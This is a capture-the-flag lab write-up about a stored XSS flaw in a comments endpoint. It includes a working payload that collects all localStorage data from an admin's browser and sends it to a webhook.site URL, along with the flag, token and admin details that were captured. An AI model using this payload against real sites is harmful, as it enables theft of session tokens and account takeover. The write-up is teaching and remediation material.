---
vulnerability: XSS
platform: BugForge
difficulty: Medium
date: 2025-11-25
---
# Lab: Stored XSS to Admin Account Takeover

- **Date**: 2025-11-25
- **Platform**: BugForge
- **Difficulty**: Medium
- **Vulnerability**: Stored Cross-Site Scripting (XSS)

## Vulnerability Overview
A stored XSS vulnerability in the comments functionality allowed attackers to steal admin authentication tokens and flags via localStorage exfiltration.

## Vulnerable Endpoint
```POST /api/snippets/comments```

## Attack Flow
1. **Injection Point**: Comment text field
2. **Trigger**: Admin bot reviews comments every ~60 seconds
3. **Execution**: XSS payload executes in admin's browser context
4. **Impact**: Full compromise of admin account via token theft

## Exploitation Payload
```
<img src=x onerror="
var lsData = [];
for(var i=0; i<localStorage.length; i++) {
    var key = localStorage.key(i);
    lsData.push(key + '=' + localStorage.getItem(key));
}
window.location.href = 'https://webhook.site/ID?localStorage=' + encodeURIComponent(lsData.join(';;'));
">
```

## Payload Breakdown
- ```<img src=x onerror=...>```: XSS vector that triggers on image load error
- localStorage enumeration: Iterates through all stored key-value pairs
- ```window.location.href```: Navigation-based exfiltration (bypasses CORS)
- Data encoding: Prevents special character issues in URL

## Exfiltrated Data
- Admin Account Compromise:
    {
    "flag": "bug{54e29503ad5f5aa8383e22568ad31fbd3}",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
        "id": 1,
        "username": "admin",
        "role": "admin",
        "email": "admin@copypasta.com"
    }
    }

## Lesson Learned
- Stored XSS in user-generated content can lead to full account takeover
- Admin review features create automated attack vectors
- localStorage often contains sensitive authentication data
- Navigation-based exfiltration reliably bypasses CORS restrictions

## Remediation
- Input Validation: Sanitize user input (HTML encoding)
- Content Security Policy: Implement CSP headers
- HttpOnly Cookies: Store tokens in HttpOnly cookies instead of localStorage
- Output Encoding: Encode dynamic content in comments